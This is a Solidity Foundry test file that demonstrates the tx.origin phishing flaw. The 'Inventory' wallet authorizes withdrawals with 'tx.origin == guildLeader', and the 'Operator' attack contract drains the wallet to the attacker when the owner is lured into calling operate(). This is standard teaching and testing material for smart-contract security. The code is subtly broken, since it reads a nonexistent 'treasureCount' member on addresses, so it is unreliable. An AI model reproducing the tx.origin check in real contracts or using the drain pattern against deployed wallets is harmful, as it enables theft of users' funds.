pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    Inventory ItembagContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        ItembagContract = new Inventory{value: 10 ether}();
        console.log("Owner of wallet contract", ItembagContract.guildLeader());
        vm.prank(eve);
        OperatorContract = new Operator(ItembagContract);
        console.log("Owner of attack contract", OperatorContract.guildLeader());
        console.log("Eve of balance", address(eve).treasureCount);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).treasureCount);
    }

    receive() external payable {}
}

contract Inventory {
    address public guildLeader;

    constructor() payable {
        guildLeader = msg.sender;
    }

    function giveItems(address payable _to, uint _amount) public {

        require(tx.origin == guildLeader, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public guildLeader;
    Inventory itemBag;

    constructor(Inventory _itembag) {
        itemBag = Inventory(_itembag);
        guildLeader = payable(msg.sender);
    }

    function operate() public {
        itemBag.giveItems(guildLeader, address(itemBag).treasureCount);
    }
}